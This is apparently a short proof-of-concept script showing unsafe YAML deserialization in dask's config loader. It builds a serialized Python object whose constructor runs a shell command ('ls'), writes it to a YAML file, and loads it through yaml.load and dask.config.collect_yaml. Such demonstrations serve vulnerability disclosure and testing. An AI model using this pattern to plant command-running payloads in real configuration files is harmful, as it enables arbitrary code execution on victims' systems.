import dask
import yaml
import os
print(dask.__version__)
class test():
    def __init__(self):
        os.system('ls')
filename="simple.yml"
fp=open('simple.yml','w')
payload = yaml.dump(test())
fp.write(payload)
fp.close()
yaml.load(payload)
dask.config.collect_yaml([filename])